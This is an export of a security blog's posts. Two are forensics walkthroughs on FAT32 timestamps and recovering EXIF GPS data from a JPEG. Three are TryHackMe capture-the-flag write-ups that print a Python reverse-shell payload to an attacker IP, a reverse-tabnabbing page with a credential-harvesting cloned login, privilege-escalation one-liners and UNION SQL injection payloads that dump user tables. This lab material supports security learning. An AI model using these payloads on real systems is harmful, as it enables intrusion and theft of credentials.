[ { "title": "Sunday Funday # 814 - FAT32 Access Time", "url": "/posts/FAT32-Access-Time/", "categories": "WriteUp, Digital Forensics", "tags": "WriteUp", "date": "2025-04-20 17:00:00 +0000", "snippet": "Sunday Funday # 814 - David Cowen - HECFBlogChallenge:FAT32 does not store a time stamp for access dates, it only records the date. However many tools have or have in the past actually treated the zero time entry as a real time entry and adjusted it for time zones. Test your favorite tools such as , ftk imager, xways, axiom, encase, autopsy your choice but you must submit at least two and show if they are correctly handling FAT32 timestamps.This is my first Sunday Funday submission! No expectations of winning a grand prize or anything but just wanting to throw my hat in the ring and explore FAT32. I’m also submitting late due to NCCDC and didn’t get around to testing a second tool, so I wouldn’t meet the requirements anyways.Regardless, I learned quite a bit about FAT32 by doing this challenge: how it’s structured, its limitations, and how certain tools might misinterpret the zero time entry and adjust it with the local time zone.I tried to make this post as detailed as I could. Mostly because a lot of it is somewhat new to me. I’ve previously explored JPEGs to manually recover location data, but that’s about the extent of my “low-level” manual carving experience. I’m doing a little more of that for this challenge just for fun :)Testing System (Arch Linux (btw)):uname -acat /etc/os-releasedateI created a small partition on my host with 20G of storage and set the type to EFI System:20 gigs is a ton…and I regret this later…Next I formatted the partition with FAT32, mounted the partition to /mnt/FAT32, created a file (test.txt) with some “DATA”, and then un-mounted the partition.Then I took a logical bit-by-bit copy of the partition using the dd command:The result is a test.img file containing the raw data from the FAT32 formatted partition.Baseline - RAW Timestamp DataTo get a baseline I figured it would be best to see what timestamp information FAT32 has stored for test.txt before testing tools. I ended up doing this after testing the first tool (istat). So my command line timestamps aren’t aligned with the order I did things.This is probably more than I need to do, but I enjoy digging in to documentation on new things.First I had to find the directory entry for the test.txt file to locate the timestamp information.I’m using fsstat from The Sleuth Kit to get file system information from test.img.The fsstat output below shows some key information for locating the entry. Label Value Cluster Size 16384 (32 sectors per cluster x 512 bytes) Sector Size 512 bytes Root Directory Cluster 2 Root Directory Sector Range 20512 - 20543 I’ve also used fls to list file and directory names in the disk image.test.txt is the 4th directory entry.This information can be used to find the offset for the test.txt directory entry and then the timestamps.Cluster 2 starts at offset 20512. Multiplying this offset by 512 will get the offset of the root directory.echo $((20512 * 512))10502144The offset I need to check is 10502144and the 4th directory entry appears to be at the top, which is my test.txt file.To make sense of the data I followed this Directory Structure documentation.Each Directory Entry Structure is 32 bytes long.The first 32 bytes is a Long File Name Entry Structure:4174 0065 0073 0074 002e 000f 008f 7400 7800 7400 0000 ffff ffff 0000 ffff ffff Offset Size Field Hex Value Info 0x00 1 byte Sequence Number 41 A - Long File Name Sequence Number (LFN) 0x01 10 bytes Name Part 1 74 002e 000f 00 test. - 0x00 are null values 0x0B 1 byte Attributes 0f LFN 0x0C 1 byte Type 00   0x0D 1 byte Checksum of Short File Name 8f 143 - Checksum value (I don’t understand this) 0x0E 12 bytes Name Part 2 7400 7800 7400 0000 ffff ffff txt - the file extension 0x1A 2 bytes First cluster 0000 ffff 0 0x1C 4 bytes Name Part 3 ffff Padding Basically, this first 32 byte entry is for the filename.The next 32 bytes is a Standard 8.3 Directory Entry Structure (Time and Date):5445 5354 2020 2020 5458 5420 008b 7890 965a 965a 0000 7890 965a 0300 0500 0000 Offset Size Field Hex Value Value 0x00 11 bytes Filename (8.3 Format) 5445 5354 2020 2020 5458 54 TEST TXT 0x0B 1 byte Attributes 20 Archive Bit Set 0x0C 1 byte Reserved 00 Always Zero 0x0D 1 byte Creation Time Tenths 8b 139 - Milliseconds 0x0E 2 bytes Creation Time 7890-&gt;9078 (Little Endian) 10010-&gt;18000011-&gt;311000-&gt;24*2=4818:03:48 0x10 2 bytes Creation Date 965a-&gt;5a96 (Little Endian) 0101101-&gt;1980+45=20250100-&gt;410110-&gt;224-22-2025 0x12 2 bytes Last Access Date 965a-&gt;5a96(Little Endian) 0101101-&gt;1980+45=20250100-&gt;410110-&gt;224-22-2024 0x14 2 bytes High 16 Bits of Cluster 0000 - 0x16 2 bytes Last Modified Time 7890-&gt;9078(Little Endian) 10010-&gt;18000011-&gt;311000-&gt;24*2=4818:03:48 0x18 2 bytes Last Modified Date 965a-&gt;5a96(Little Endian) 0101101-&gt;1980+45=20250100-&gt;410110-&gt;224-22-2025 0x1A 2 bytes Low 16 Bits of Cluster 0300 - 0x1C 4 bytes File Size 0500 0000 1280 bytes The time and date information is in this second entry and I was able to convert the bytes to dates and timestamps from the documentation. Field Value Creation Time 18:03:48 Creation Date 4-22-2025 Last Access Date 4-22-2025 Last Modified Time 18:03:48 Last Modified Date 4-22-2025 FAT32 uses localtime for its timestamps, however, my system clock is set to UTC. So while my localtime is actually 14:03:48 EDT at the time I made the test.txt file, FAT32 used my system clock and the timestamps are UTC there.Now I know what FAT32 recorded for time and date and I can compare it to the tools that I’m going to test.Tool Test 1 - istat (TheSleuthKit)The first tool I tested was istat from the The Sleuth Kit.You might notice the time is now 14:16:06 - I actually did this part before digging in to FAT32 manually.The Sleuth Kit version is 4.13.0I used the fls tool from The Sleuth Kit to get the test file’s inode number. However, I learned that FAT32 does not have an “inode table”, but has “directory entries” in a directory entry table (structure). The number it identified for my test.txt file was 4.Just below the fls output is the istat command output. istat uses the Directory Entry number (4) to check the 4th directory entry.The output from istat appears to accurately interpret the Accessed zero time entry.If it had adjusted for the time zone, i’d have expected to see the Accessed Timestamp to be 20:00:00 for the previous day since I am UTC-4.ReferencesDavid Cowen - HECFBlogThe Sleuth KitistatDirectory Structurefls" }, { "title": "Manual Recovery of Location Data From JPG", "url": "/posts/Corrupted-Image/", "categories": "WriteUp, Digital Forensics", "tags": "WriteUp", "date": "2023-10-13 17:00:00 +0000", "snippet": "This post is a walkthrough of how to manually recover location data from an image using a hex editor (HxD). I will provide two methods for doing this.I will be using an intentionally corrupted image that I created. If you’d like to try it yourself, you can open this image in a new tab and download it, then open it in a hex editor. Most of the image data has been overwritten with null values, which is why the image doesn’t display anything when its opened. This is meant to simulate what might happen if the image file were deleted and partially overwritten, but without the complicated overwritten data and just null values instead. There is just enough data remaining from the original image for it to be identified as a valid image and the important EXIF data still remains in the file! All of this data can be viewed using a Hex Editor such as HxD.EXIF Tool (Simple Method)You might try taking the jpg file and using an online EXIF tool to view the location data.Unfortunately, this won’t return any of the useful EXIF information. This has to do with the TIFF Header Structure of this corrupted image. TIFF stands for Tag Image File Format and its used to represent raster graphics(2-D Images as a grid of pixels) and store image information (like location data or created date).When looking at a JPG in a hex editor, the first few offsets of the file contain some important information for the EXIF tool to identify the image and the metadata it has.FF D8 is at offset 0 and 1, and identifies the start of a JFIF, JPE, JPEG, or JPG. These offsets are crucial for the EXIF tool. If these offsets were missing, the EXIF tool would not recognize this file as a JPG.There is also a trailer FF D9 which identifies the end of the file.The next few offsets can optionally contain an EXIF Tool tag name or an SPIFF tag name. This data has been tampered with, DE AD BE EF spells DEADBEEF and doesn’t provide any useful information other than that the files data has been tampered with. These offsets aren’t important for the EXIF tool in finding the metadata anyways.Offset 12 is where the fun begins and leads towards the first solution of this challenge.The start of the TIFF Header Structure can begin with either 4D 4D (MM in ascii) or 49 49 (II in ascii). Here, there is a 4D for an M, but only just one. If you are clever and realize there should be two M’s, you might change the null value at offset 13 to 4D, save the change and reupload the image to an EXIF Tool.With this simple change the exiftool has everything it needs to identify all the IFD entries, including the location data.BUT…if you are an intellectually starving nerd like myself, you might push on to understand where this data actually lives in the file. Why? Because why not? You can’t just leave knowledge on the table.Image File Directory (IDF) Searching for GPS DataByte Order and IFD OffsetThe TIFF Header Structure is 8 bytes long. Bytes Hex Values Meaning 0 to 7 4D 4D 00 2A 00 00 00 08 8-Bytes 0 to 1 4D 4D Byte Order 2 to 3 00 2A TIFF File 4 to 7 00 00 00 08 Offset of the first IFD Image File DirectoryThis is where the image data pointers and metadata are stored. This directory could come before or after the actual image data itself.In this case, the IFD0 is located at offset 8. This is heavily confusing because we just looked at offsets 12 to 19 to see the 8 byte TIFF Header Structure. What this offset 8 byte value actually means is to start from the beginning of the TIFF File. The TIFF file began at offset 12 with a value of 4D. We need to add 8 bytes starting from offset 12 and look at the next bytes to see the first IFD entry.To put it another way, we can add 12 bytes from the very beginning of the file.IFD0 Bytes Hex Value Meaning + 02 00 0D 13 Directory Entries + 12 01 00 00 03 00 00 00 01 0F C0 00 00 Entry 0 + 12 01 01 00 03 00 00 00 01 0B D0 00 00 Entry 1 + 12 01 0F 00 02 00 00 00 08 00 00 00 AA Entry 2 + 12 01 10 00 02 00 00 00 09 00 00 00 B2 Entry 3 + 12 01 12 00 03 00 00 00 01 00 01 00 00 Entry 4 + 12 01 1A 00 05 00 00 00 01 00 00 00 BC Entry 5 + 12 01 1B 00 05 00 00 00 01 00 00 00 C4 Entry 6 + 12 01 28 00 03 00 00 00 01 00 02 00 00 Entry 7 + 12 01 31 00 02 00 00 00 0E 00 00 00 CC Entry 8 + 12 01 32 00 02 00 00 00 14 00 00 00 DA Entry 9 + 12 02 13 00 03 00 00 00 01 00 01 00 00 Entry 10 + 12 87 69 00 04 00 00 00 01 00 00 00 EE Entry 11 + 12 88 25 00 04 00 00 00 01 00 00 03 1E Entry 12 + 04 00 00 00 00 Offset to next IDF (None) The first 2 bytes tell us that there are 13 12-byte entries that follow. Then the next IFD is pointed to at the end.12-Byte Field Entry 0 BreakdownThe first 12 bytes are broken down as follows: Bytes Hex Value Meaning Information 0 to 11 01 00 00 03 00 00 00 01 0F C0 00 00 IFD Entry 0 12-Bytes 0 to 1 01 00 Field Identifying Tag 256 = Exif.Image.ImageWidth 2 to 3 00 03 Field Type SHORT (2 byte unsigned integer) 4 to 7 00 00 00 01 Count of the Type 1 count 8 to 11 0F C0 00 00 The Value Offset 0FC0 = 4032 Bytes 8 to 11 don’t actually point to an IFD value offset. Rather, the value of the image width is recorded here instead since it fits in 4 bytes or less. The value is the first 4 bytes starting from the left. 0F C0 means the width is 4032 and this is confirmed by looking back at the EXIF tool results:The 12 byte field entries contain the metadata we want to view. In this first directory entry we looked at the Exif.Image.ImageWidth data. Using an Exif tags table as a reference, we can look for the directory entry that has GPS Info.GPS Info TagThe GPS info tag has the hex value of 8825 and can be searched for within the 13 12-byte entries.Looking back at the table above, the 13th directory entry contains an Exif Tag for GPS info.12-byte breakdown of IFD Entry 13 Byte Hex Meaing Information 0 to 11 88 25 00 04 00 00 00 01 00 00 03 1E IFD Entry 13 12-Bytes 0 to 1 88 25 Field Identifying Tag GPSTag 2 to 3 00 04 Field Type LONG (4 byte unsigned integer) 4 to 7 00 00 00 01 Count of the Type 1 count 8 to 11 00 00 03 1E The Value Offset Offset 798 Starting from the beginning of the TIFF File, the GPS IFD should start at offset 798 and what follows is a new IFD with its own number of 12-byte entries and values.Following the same IFD structure of 2-byte number of entries and then x number of 12-byte entries, we can determine what this IFD has in it.GPS Info IFD Breakdown Bytes Hex Meaning 0 to 1 00 09 9 Directory Entries   00 01 00 02 00 00 00 02 4E 00 00 00 Entry 0   00 02 00 05 00 00 00 03 00 00 03 90 Entry 1   00 03 00 02 00 00 00 02 57 00 00 00 Entry 2   00 04 00 05 00 00 00 03 00 00 03 A8 Entry 3   00 05 00 01 00 00 00 01 00 00 00 00 Entry 4   00 06 00 05 00 00 00 01 00 00 03 C0 Entry 5   00 07 00 05 00 00 00 03 00 00 03 C8 Entry 6   00 1B 00 07 00 00 00 0C 00 00 03 E0 Entry 7   00 1D 00 02 00 00 00 0B 00 00 03 EC Entry 8   00 00 00 00 00 Offset to Next IFD (None) There are 9 directory entries in this GPS Info IFD. A GPS Info Tag reference can be used to identify the field tags. Entry # Field Tag Field Type Count Value 0 GPSLatitudeRef ASCII 2 N 1 GPSLatitude RATIONAL 3 Value at offset 0390 = 42 58 13.1555 2 GPSLongitudeRef ASCII 2 W 3 GPSLongitude RATIONAL 3 Value at offset 03A8 = 85 40 13.7531 4 GPSAltitudeRef BYTE 1 0 = Above Sea Level 5 GPSAltitude RATIONAL 1 Value at offset 03C0 = 180.552 6 GPSTimeStamp RATIONAL 3 Value at offset 03C8 = 23:28:24 UTC 7 GPSProcessingMethod UNDEFINED 12 Skip 8 GPSDateStamp ASCII 11 Value at offset 03EC = 2023:09:27 Each RATIONAL Field Type consists of 2 LONGs. The first LONG is the numerator and the second LONG is the denominator. I converted the hex values to their decimal value and divided.As an example, Entry 1 contains 3 RATIONAL values.The first value is a LONG at offset 0390 is 00 00 00 2A (42) followed by the second LONG 00 00 00 01 (1)The second value is 00 00 00 3A (58), followed by the second LONG 00 00 00 01 (1)The third value is a LONG 00 02 01 E3 (131555) and the second LONG 00 00 27 10 (10000)After dividing 131555 by 10000 you have 13.1555.The 3 RATIONAL values are in a Degrees, Minutes, Seconds format. 42° 58' 13.155\"The Final Coordinates are: 42° 58' 13.155\" N85° 40' 13.7531\" WTa-DaThese coordinates are for this address:United States District Court for the Western District of Michigan110 Michigan Street Northwest, Grand Rapids, MI 49503 United States of AmericaThe original, uncorrupted image: References:https://www.garykessler.net/library/file_sigs.htmlhttps://www.cipa.jp/std/documents/e/DC-008-2012_E.pdfhttps://exiv2.org/tags.htmlhttps://docs.fileformat.com/image/exif/https://exiftool.org/TagNames/GPS.html" }, { "title": "Wonderland", "url": "/posts/Wonderland/", "categories": "TryHackMe, WriteUp", "tags": "TryHackMe, WriteUp, Wonderland", "date": "2022-07-23 17:00:00 +0000", "snippet": "Wonderland can be found hereEnumerationNmapThe results of nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=| 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit.| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelManual InspectionThe home page contains only an imageFuzzing for DirectoriesUsing Wfuzz, I enumerate directorieswfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --follow --hc 404 http://10.10.241.146/FUZZ/One of the first results comes back as the ‘/r/’ directory.I had a feeling this was going to spell out the word ‘rabbit’, so I checked.There is a page here and checking the source reveals something interesting.There are credentials hidden in the page source.Lateral MovementAliceThe credentials i found grant SSH access as the user ‘alice’.Digging into the users permissions reveals the ability to execute a python script as the user ‘rabbit’sudo -lRabbitThe python script uses the ‘random’ module and this can exploited by abusing the way python looks up library modules. The first location python checks is the current directory. The random module is located at /usr/lib/python3.6/random.py. By placing a malicious file name ‘random.py’ in the current directory, python will find and use my module before it reaches the `\t/usr/lib/python3.6/random.py` location.The payload I will use:import socket,os,pty s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.2.7.45\",4242)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) pty.spawn(\"/bin/sh\")and this will be stored in a file called ‘random.py’ in the directory containing the ‘walrus_and_the_carpenter.py’ script.Setting up a netcat listener on 4242 and then executing the script as the user rabbit will provide a reverse shell as the next user.sudo -u rabbit python3.6 ~/walrus_and_the_carpenter.pyHatterThe rabbit user contains a binary called ‘teaParty’ and their is a SUID set on the binary.I downloaded a strings static binary onto the target and inspected the strings in the binary.This revealed that the binary uses the ‘date’ command without an absolute path. This way I can hijack the command with my own by added a malicious ‘date’ binary to the tmp directory and including the tmp directory in the path.the malicious date binary will contain a reverse shell payload and then be made executableThe tmp directory is also added to the pathA netcat listener is started on port 2345 and then the binary is executed for a reverse shell as the user HatterPrivilege EscalationRootUser hatter contains a password file in the home directory that I will use to login via SSHI ran through the Privilege Escalation Checklist and found that the hatter user has capabilities set on Perl.There is a privilege escalation path found on GTFO binsThe payload:perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'" }, { "title": "Napping", "url": "/posts/Napping/", "categories": "TryHackMe, WriteUp", "tags": "TryHackMe, WriteUp, Napping", "date": "2022-07-22 17:00:00 +0000", "snippet": "Napping can be found hereNmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 85:f3:f5:b4:8c:24:1e:ef:6f:28:42:33:7c:2a:22:b4 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmgxcZKHEVEbLHxkmo/bjXYP9qMuWYGmbV0Tl/maOUcfyhPcPPcl2S/RzgKgfWR5MBUit4/iD+LBbKvIqv5NsXAMjUFaC35mXLRrEhUXSP4pfcaWGzKARRJ4C9eUHJ1aT/vhU0ZNnhOW1H8Ig+btzcIqeiQJiKH+iGySyTsXJ3qLOAcQ4qwGKfdpnPtN3MYG7Ba6etdN4J+FVm/tjcUxE76ZKv5IdN+iOeTwBhKhk8lTPf6G8S7X2jx38deqAI6j20UBAnlFdfSjVrbavfzoeyAKODpzmgQ0J/VFWIZGqqMxg/Hq6KChT67DTMxrnfN7wojS2/fItjIpsvjTxlxhiHSvi+57ngJlPYKbiqU4P1nbxSB+eyy0UK44ln6MbLpCcRkvwOP87VOvfII4TfXostq94fYRW8G7oszKGFrucQdYoVTFhKgYveKe0np4eGG/GdPefDbLp5VoNTjs7WBDSxn5jY+0A/IY1/EjuaGlQvpk5IxDbU/mYm9bPeSYdAWgk=| 256 c2:7b:a9:0c:28:7c:d1:cd:03:23:f4:a8:bc:02:72:4b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBP4j+pg12EElUiOMAVpEuqFCympfDuyyZ7McBGxU9lCp4qMOGKShc96y4656MSnAZu7ofMx9DyO1sDwcfbI3MQ=| 256 fe:92:00:b4:ee:5e:5a:92:52:90:9f:5e:0b:fd:61:a3 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ0X6D1WGTnXedsm4aFXKIEt6iY22msqmq2QvKPW3VXM80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-title: Login|_http-server-header: Apache/2.4.41 (Ubuntu)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set| http-methods: |_ Supported Methods: GET HEAD POST OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 22 and 80 are open. I’ll start by manually inspecting the webpage.Manual InspectionThe first page is a login.There is also an option to sign up. I’ll create a new user to see what else is here.Once logged in as my newly created user, there is a welcome page.I’m able to upload a link that will be interacted with by the admin.Directory and File FuzzingFirst i’ll enumerate directories.Then i placed the output into its own file to enumerate files in each of these directories.In addition to the index.php login page, there is an admin login page.Inspect Page SourceThe Welcome Page source reveals a known vulnerability with “target=_blank” called Reverse Tab Nabbing. HackTricks - Reverse Tab NabbingPlan of AttackThe objective is to setup a malicious page and submit the link to it. Once the admin clicks the link the delivered resource will open a new tab and the “window.opener” object will reload the original tab with another malicious webpage that looks like the admin login.Create the malicious webpage that uses the “window.opener” object to open a malicious admin login page in the admins original tab.&lt;html&gt; &lt;body&gt; &lt;h1&gt;L15t3Nr's Webpage&lt;/h1&gt; &lt;script&gt; if (window.opener) { window.opener.location = \"http://10.2.7.45:8000/login.php\"; } &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;The malicious login page will be a clone of the admin login page, with added php to send a post request of the contents into a ‘creds.txt’ file.&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\"&gt; &lt;style&gt; body{ font: 14px sans-serif; } .wrapper{ width: 360px; padding: 20px; } &lt;/style&gt;&lt;/head&gt;&lt;?php if (isset($_POST['username'])){ file_put_contents('creds.txt', file_get_contents('php://input')); }?&gt;&lt;body&gt; &lt;div class=\"wrapper\"&gt; &lt;h2&gt;Admin Login&lt;/h2&gt; &lt;p&gt;Please fill in your credentials to login.&lt;/p&gt; &lt;form action=\"login.php\" method=\"post\"&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input type=\"text\" name=\"username\" class=\"form-control \" value=\"\"&gt; &lt;span class=\"invalid-feedback\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label&gt;Password&lt;/label&gt; &lt;input type=\"password\" name=\"password\" class=\"form-control \"&gt; &lt;span class=\"invalid-feedback\"&gt;&lt;/span&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;input type=\"submit\" class=\"btn btn-primary\" value=\"Login\"&gt; &lt;/div&gt; &lt;br&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Then start a python server to host the malicious webpage with with “window.opener” object.A php server with host the login page.Once the admin submits their credentials it will be saved in a file named “creds.txt”daniel : C@ughtm3napping123Using CredentialsWith credentials, the next step is to try them everywhere possible and see what I have access to.The credentials give me access to Daniel’s account, but there isn’t much useful here.Fortunately, the credentials are being reused for SSH access.Lateral MovementAfter checking a few basic privileges and roles, Daniel doesn’t have the ability to use sudo, be they are part of the Administrators group.It might pay off to know what files daniel can write to using this group.There is a file owned by the administrators group in Adrians home directory. Perhaps I can exploit this file to do a bit of lateral movement.The query.py program is checking whether or not localhost is up and then placing the response into a site_status.txt file.The program runs every minute.I added a simple python reverse shell to the file and then started a netcat listener on port 1234It didn’t take long to get a reverse shell as the user Adrian.Privilege EscalationNow to check some of the privileges and roles for Adrian and see how I can get root.Adrian has the ability to run Vim as sudo without a password. GTFObins has a few ways to abuse this for a shell.sudo vim -c ':!/bin/sh'This gives a root shell." }, { "title": "Olympus", "url": "/posts/Olympus/", "categories": "TryHackMe, WriteUp", "tags": "TryHackMe, WriteUp, Olympus", "date": "2022-07-18 17:00:00 +0000", "snippet": "Olympus can be found hereEnumerationThe first step is to scan the target with nmap to discover running services.nmap22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)\t| ssh-hostkey: \t| 3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)\t| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPNeXYxrC1xv8fhFNve9CXjWSQcCXnWZThU1putOar7KBcQmoCQUYOqvmS+CDauJMPqVE3rqS0+CpTJnZn2ZWXDaCzFLZ84hjBXq8BqoWOFB0Vv0PjRKfBKC54tpA67NgLfp1TmmlS6jp4i75lxkZ6pSTOPxGUrvYvJ0iN2cAHJkgA9SZDrvT11HEp5oLmS2lXtFSoK/Q9pKNIl7y+07gZLRUeIKIn1bFRc4qrXn+rpDQR2fP9OEYiHhdJmTJJL+KjDAqZmIj0SYtuzD4Ok2Nkg5DHlCzOizYNQAkkj6Ift7dkD6LPebRp9MkAoThDzLya7YaFIP66mCbxJRPcNfQ3bJkUy0qTsu9MiiNtyvd9m8vacyA803eKIERIRj5JK1BTUKNAzsZeAuao9Kq/etHskvTy0TKspeBLwdmmRFkqerDIrznWcRyG/UnsEGUARe2h6CwuCJH8QCPMSc93zMrsZNs1z3FIoMzWTf23MWDOeNA8dkYewrDywEuOvb3Vrvk=\t| 256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)\t| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHFtzLQXLhGiDzPN7Al84lSfH3jFwGniFL5WQSaIjC+VGMU8mbvbGVuOij+xUAbYarbBuoUagljDmBR5WIRSDeo=\t| 256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)\t|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhvoRyjZN/taS1uwwTaQ4uZrGhVUje0YWW4jg4rfdXw80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))\t| http-methods: \t|_ Supported Methods: GET HEAD POST OPTIONS\t|_http-title: Olympus\t|_http-server-header: Apache/2.4.41 (Ubuntu)\t|_http-favicon: Unknown favicon MD5: ED726E098473BFA7523153F761D2232F\tService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 80 and 22 are open. The focus will be on port 80 since I don’t have credentials for SSH.HostnameThe IP address attempts to resolve to http://olympus.thm. olympus.thm will be added to /etc/hosts.Manual InspectionNow the homepage can be seen with a message on screen.The old version of the website is still accessible, so I might be able to find it. Something else though, is that if this current website is part of bleeding edge development, its more likely to have vulnerabilities. There’s also a username given of ‘root’ @ ‘the-it-department’, which may or may not be useful but it will be noted.Before I start fuzzing directories/files and virtual hosts, I’d like to do a bit more manual inspection.The wappalyzer extension shows some of the components of the website.Its useful to know that this is running on Ubuntu and the web server is Apache 2.4.41.There is a /static/ directory containing some things.There is also mention of Aperi Solve in the page source.This might indicate that some of the images have hidden data within them. I will save this path for later if nothing else is discovered.Scanning with WfuzzNow I would like to try to find the old website mentioned in the message. I might achieve this by scanning for files, directories, and virtual hosts.wfuzz -c -z file,/opt/SecList/Discovery/Web-Content/common.txt --hc 404 http://olympus.thm/FUZZ/Only a few things are returned, one being the ~webmaster directory. Interesting!Manual Inspection Continued…The ~webmaster directory leads to “Victor’s CMS”. The user root is immediately apparent, but also the name “Victor Alagwu” found at the bottom.After some clicking around manually, i learned that not much is functional on this page. Lots of dead ends. The search feature seems to work.And attempting to login does…something…But its not what I’d want from a login.I also notice there’s an interesting request when I click on any of the posts.http://olympus.thm/~webmaster/post.php?post=3 the “post” parameter is discoverd, which I attempted to fuzz for LFI. Unsuccessful.SQL InjectionSearchsploit returns a few results for “Victor CMS”.The searchsploit entries led me to checking for SQLi in the search. The result is a MySQL syntax error, so this might be the path.Poking around with SQL is quite a challenge for me, it would be helpful to be able to see the source code and get a better idea of what’s really going on.Fortunately, there is a repository on GitHub that contains just that!From the above source code, its easy to see why inputting a single quote produced an error. The single quote deliminates a string and come in pairs; one single quote at the beginning of the string and one at the end. By injecting a single quote into the search parameter the search string is terminated sooner than expected and leaves an additional unpaired single quote at the end, thus is throws an error.Once I terminate the string, its possible to inject valid SQL immediately after and then ignore the rest of the line by commenting it out.Since the injection will take place after a SELECT operator, I will need to use the UNION operator to combine two SELECT statements. Here is a resource for UNION OperatorsThe number of expressions must be the same in both SELECT statements.From the source code I can see that there are 10 rows, which means there are 10 expressions in SELECT * FROM postsTo test, I will inject the following into the search field: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -The extra dash in -- - is necessary in MySQL syntax so the “character after the whitespace … is not trailing and won’t be trimmed”. Link for more info about that: MySQL CommentThe result is everything from the 10 rows in the table posts with the number 3 showing up in the 3rd expression.I’d like to see the other databases available. To do that, I will input database() into the expression intended for the posts data.' UNION SELECT 1,2,3,4,database(),6,7,8,9,10' -- -For the post “Update is coming” the posted date is 2022-05-06, but for the following post I can see that I’ve called the database() function. The function returns “olympus” as the current database. Expression 5 corresponds with the date.The following should return table information in the expression intended for the title of the post. I used this article for help with the following payloads.' union select 1,2,group_concat(table_name),4,5,6,7,8,9,10 from information_schema.tables where table_schema = database() -- -Awesome! It looks like there’s a flag table. In order to extract information from the flag table, I’ll need to know what the column names are. That can be achieved with the following:' union select 1,2,group_concat(column_name),4,5,6,7,8,9,10 from information_schema.columns where table_schema = database() and table_name ='flag'-- -It appears there’s just one column in the flag table.Now to extract the data from this table.' union select 1,2,group_concat(flag),4,5,6,7,8,9,10 from flag-- -Woohoo! The first flag!Now, I want to know if I can enumerate some usernames and passwords.I’ll repeat the same step as before but for the users table.' union select 1,2,group_concat(column_name),4,5,6,7,8,9,10 from information_schema.columns where table_schema = database() and table_name ='users'-- -Success! I have the names of the columns in the users table.Now to extract the data within the users table.' union select 1,2,group_concat(randsalt,user_email,user_firstname,user_id,user_image,user_lastname,user_name,user_password,user_role),4,5,6,7,8,9,10 from users-- -Cool, there’s a lot of good data returned but its not in the best format. I’ll make this search request using the curl command instead, that way I can copy the data and organize it the way I want.curl http://olympus.thm/~webmaster/search.php -d 